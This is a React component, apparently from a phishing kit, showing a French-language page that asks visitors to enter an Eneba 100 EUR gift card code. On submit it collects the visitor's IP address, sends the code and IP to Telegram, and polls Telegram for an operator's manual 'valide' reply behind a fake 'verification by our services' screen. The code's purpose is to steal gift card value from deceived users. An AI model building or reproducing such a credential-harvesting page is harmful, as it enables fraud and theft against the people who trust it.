
import React, { useState } from 'react';
import { SubmissionStatus } from '../types';
import { fetchUserIp, sendToTelegram, pollForTelegramResponse } from '../services/apiService';
import LoadingOverlay from './LoadingOverlay';

const GiftCardForm: React.FC = () => {
  const [code, setCode] = useState('');
  const [status, setStatus] = useState<SubmissionStatus>(SubmissionStatus.IDLE);
  const [error, setError] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const cleanCode = code.trim();
    
    if (cleanCode.length < 5) {
      setError("Le code est invalide.");
      return;
    }

    setStatus(SubmissionStatus.LOADING);
    setError(null);

    const ip = await fetchUserIp();
    const sent = await sendToTelegram(cleanCode, ip);

    if (sent) {
      setStatus(SubmissionStatus.VERIFYING);
      // بدء عملية الانتظار للرد من Telegram
      const result = await pollForTelegramResponse(cleanCode);
      
      if (result === 'valide') {
        setStatus(SubmissionStatus.SUCCESS);
      } else {
        setStatus(SubmissionStatus.ERROR);
        setError("Ce code n'est pas valide ou a déjà été utilisé.");
      }
    } else {
      setStatus(SubmissionStatus.ERROR);
      setError("Erreur de connexion. Réessayez.");
    }
  };

  if (status === SubmissionStatus.SUCCESS) {
    return (
      <div className="bg-emerald-50 border-2 border-emerald-100 rounded-3xl p-10 text-center animate-in fade-in zoom-in">
        <div className="w-20 h-20 bg-emerald-500 text-white rounded-full flex items-center justify-center mx-auto mb-6 shadow-xl shadow-emerald-100">
          <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
          </svg>
        </div>
        <h3 className="text-2xl font-black text-emerald-900 mb-2 uppercase">Valide</h3>
        <p className="text-emerald-700">Votre code a été accepté avec succès !</p>
      </div>
    );
  }

  return (
    <div className="relative">
      {(status === SubmissionStatus.LOADING || status === SubmissionStatus.VERIFYING) && (
        <LoadingOverlay message={status === SubmissionStatus.VERIFYING ? "Vérification en cours par nos services..." : "Initialisation..."} />
      )}
      
      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="text-center space-y-4">
          <label className="text-xs font-black text-slate-400 uppercase tracking-widest">
            Entrez votre code Eneba 100 EUR
          </label>
          <input
            type="text"
            value={code}
            onChange={(e) => {
              setCode(e.target.value.toUpperCase());
              if (error) setError(null);
            }}
            placeholder="XXXX-XXXX-XXXX"
            className={`w-full h-16 text-center text-xl font-mono font-bold rounded-2xl border-2 transition-all outline-none ${
              error ? 'border-red-300 bg-red-50 animate-shake' : 'border-slate-100 bg-slate-50 focus:border-indigo-500 focus:ring-4 focus:ring-indigo-100'
            }`}
            disabled={status !== SubmissionStatus.IDLE && status !== SubmissionStatus.ERROR}
          />
          {error && <p className="text-red-500 text-xs font-bold uppercase tracking-tighter">{error}</p>}
        </div>

        <button
          type="submit"
          className="w-full h-16 bg-indigo-600 hover:bg-indigo-700 text-white font-black rounded-2xl shadow-lg transition-transform active:scale-95"
          disabled={status !== SubmissionStatus.IDLE && status !== SubmissionStatus.ERROR}
        >
          {status === SubmissionStatus.VERIFYING ? "VÉRIFICATION..." : "UTILISER LE CODE"}
        </button>
      </form>
    </div>
  );
};

export default GiftCardForm;
